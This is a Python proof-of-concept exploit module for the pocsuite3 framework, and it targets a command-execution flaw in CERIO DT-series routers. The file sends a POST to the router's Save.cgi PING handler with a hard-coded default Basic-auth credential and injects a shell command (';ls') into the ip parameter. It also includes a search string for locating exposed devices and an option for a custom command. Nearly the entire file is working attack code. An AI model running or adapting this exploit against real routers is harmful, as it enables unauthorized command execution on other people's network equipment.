# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = "2024"
    createDate = "2024-3-21"
    updateDate = "2024-3-21"
    references =[]
    name ="CERIO DT系列路由器命令执行漏洞"
    appPowerLink = ''
    appName = 'CERIO DT系列路由器'
    appVersion = ''
    vulType = '命令执行'
    desc = '''
    title="DT-100G-N" || title="DT-300N" || title="DT-100G" || title="AMR-3204G" || title="WMR-200N"
    '''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/cgi-bin/Save.cgi?cgi=PING'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Authorization': 'Basic b3BlcmF0b3I6MTIzNA=='
                    }
        payload = '''pid=2061&ip=127.0.0.1;ls&times=1'''
        r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
        try:
            if r.status_code == 200 and 'uid' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url+"\n"+r.text
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        return self.parse_output(result)
        
register_poc(DemoPOC) 
